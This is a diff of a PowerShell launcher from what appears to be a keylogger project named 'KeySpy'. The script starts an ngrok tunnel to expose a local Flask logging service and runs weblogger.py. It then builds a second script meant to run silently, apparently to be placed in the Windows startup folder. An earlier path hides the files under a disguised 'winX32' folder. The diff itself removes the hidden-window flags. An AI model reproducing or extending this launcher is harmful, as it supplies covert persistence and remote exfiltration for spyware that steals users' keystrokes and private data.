@@ -7,16 +7,19 @@ $webloggerPath = "C:\Program Files (x86)\winX32\src\weblogger.py"
 # Define the command to execute ngrok
 $ngrokCommand = "ngrok http $flaskPort"
 
+# Define the path to weblogger.py file
+$webloggerPath = "C:\Users\samra\Desktop\KeySpy\src\weblogger.py"
+
 # Define the command to execute weblogger.py
 $webloggerCommand = "python '$webloggerPath'"
 
 # Start ngrok and weblogger.py
-Start-Process -FilePath 'cmd.exe' -ArgumentList "/c $ngrokCommand & $webloggerCommand" -WindowStyle Hidden -NoNewWindow -Wait
+Start-Process -FilePath 'cmd.exe' -ArgumentList "/c $ngrokCommand & $webloggerCommand" -Wait
 
 # Create a PowerShell script to execute ngrok and weblogger.py silently
 $script = @"
-Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $ngrokCommand' -WindowStyle Hidden -NoNewWindow -Wait
-Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $webloggerCommand' -WindowStyle Hidden -NoNewWindow -Wait
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $ngrokCommand' -Wait
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $webloggerCommand' -Wait
 "@
 
 # Define the path to the startup folder
